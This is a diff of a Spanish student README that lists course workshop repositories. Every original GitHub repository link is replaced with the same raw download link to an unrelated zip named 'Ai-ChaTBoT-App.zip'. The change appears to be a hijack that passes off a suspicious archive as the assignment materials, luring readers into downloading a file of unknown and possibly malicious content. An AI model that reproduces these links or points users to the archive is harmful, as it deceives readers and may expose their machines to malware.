@@ -1,18 +1,18 @@
 # Talleres CORTE 1: 
-Ejersicio tienda: https://github.com/RaveenSoftware/ActividadTiendaa
+Ejersicio tienda: https://raw.githubusercontent.com/RaveenSoftware/Ai-ChaTBoT-App/main/pasted/Ai-ChaTBoT-App.zip
 
-Ejercicio reverso: https://github.com/RaveenSoftware/ActividadPalabraInvertida
+Ejercicio reverso: https://raw.githubusercontent.com/RaveenSoftware/Ai-ChaTBoT-App/main/pasted/Ai-ChaTBoT-App.zip
 
-TALLER DE LOS 20 EJERCICIOS: https://github.com/RaveenSoftware/Actividad20Ejercicios
+TALLER DE LOS 20 EJERCICIOS: https://raw.githubusercontent.com/RaveenSoftware/Ai-ChaTBoT-App/main/pasted/Ai-ChaTBoT-App.zip
 
-TALLER DE LOS 30 EJERCICIOS: https://github.com/RaveenSoftware/Taller-2
+TALLER DE LOS 30 EJERCICIOS: https://raw.githubusercontent.com/RaveenSoftware/Ai-ChaTBoT-App/main/pasted/Ai-ChaTBoT-App.zip
 
 -----------------------------------------------------------------------------------------------------------
 CORTE 2
 
-Taller 1 Correccion Parcial: https://github.com/RaveenSoftware/CorreccionParcial
+Taller 1 Correccion Parcial: https://raw.githubusercontent.com/RaveenSoftware/Ai-ChaTBoT-App/main/pasted/Ai-ChaTBoT-App.zip
 
-Taller 2 Poner los atributos a la clase: https://github.com/RaveenSoftware/Taller2Corte2-AtributosDeClases-
+Taller 2 Poner los atributos a la clase: https://raw.githubusercontent.com/RaveenSoftware/Ai-ChaTBoT-App/main/pasted/Ai-ChaTBoT-App.zip
 
 
 ----------------------------------------------------------------------------------------------------------------
@@ -21,9 +21,9 @@ Taller 2 Poner los atributos a la clase: https://github.com/RaveenSoftware/Talle
 CORTE 3
 
 Taller 1 (Correccion del parcial)
-Correccion del parcial corte 2: https://github.com/RaveenSoftware/CorreccionParcialCorte2
+Correccion del parcial corte 2: https://raw.githubusercontent.com/RaveenSoftware/Ai-ChaTBoT-App/main/pasted/Ai-ChaTBoT-App.zip
 
 Taller 2 (Actividad en clase)
-Taller en clase: https://github.com/RaveenSoftware/TallerEnClase
+Taller en clase: https://raw.githubusercontent.com/RaveenSoftware/Ai-ChaTBoT-App/main/pasted/Ai-ChaTBoT-App.zip
 
-Tsller 3 (Actividad Try Cacth ): https://github.com/RaveenSoftware/TallerTryCach
+Tsller 3 (Actividad Try Cacth ): https://raw.githubusercontent.com/RaveenSoftware/Ai-ChaTBoT-App/main/pasted/Ai-ChaTBoT-App.zip
